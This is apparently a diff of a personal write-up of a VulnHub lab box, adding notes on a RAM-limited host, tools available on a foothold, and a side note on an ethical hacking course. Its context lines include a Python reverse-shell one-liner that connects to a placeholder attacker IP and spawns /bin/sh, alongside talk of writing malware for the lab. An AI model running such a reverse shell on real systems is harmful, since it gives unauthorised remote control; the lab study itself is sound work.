@@ -150,7 +150,10 @@
 	for this box, and frankly just want to code malware with this gift from 
 	vulnhub. On the other hand, it is likely that there is something hidden in 
 	the cron jobs that can be exploited, and it would be a shame to not explore 
-	that avenue. 
+	that avenue. '
+
+	The RAM Problem:
+	Good ol Marvin can only hold so much data, and only be up for so long. Because its all /tmp, the longer it lives the worse it kinda gets. So we'll have to use it as a production server for our malware.
 
 ### 3.) Porteus=157 (Python3 HTTP Web Server)
 
@@ -931,6 +934,10 @@ After some brief testing, I've concluded that the best route to the next foothol
 So an update:
 
 	We're in, but its a locked down root account with little permissions to its name. Theres a "nobody" account that has more permissions than root. We have our target, and we have our goal in sight. The /root folder is locked down, and the obvious target is nobody. In addition, there is a mysql datbase running. Perhaps the key to all the accounts lies in there. The etc/passwd file is viewable as well. This is interesting.
+
+Tools available:
+
+So we have leafpad, which means we can build whatever proper if we are missing anything. We are in a non-exec account, but its not temp, it STAYS. So this makes writing software for it much easier than Marvin. However, it has no browser and no way to ssh transfer the data over. So we are relying on good ol copy/paste.
 	
 
 ## Living off the Land Blurb
@@ -960,3 +967,8 @@ For bash thats:
 and python, my dream girl:
 
 	$ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<attackerip>',<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > /tmp/shell.py; chmod +x /tmp/shell.py; python /tmp/shell.py
+
+
+# Side Note: Learning by Doing vs Reverse Engineering
+
+I find myself at an impasse between school and self study. I usually have been reverse engineering everything, but now I'm on an ethical hacking course to learn the tools, vs building them.
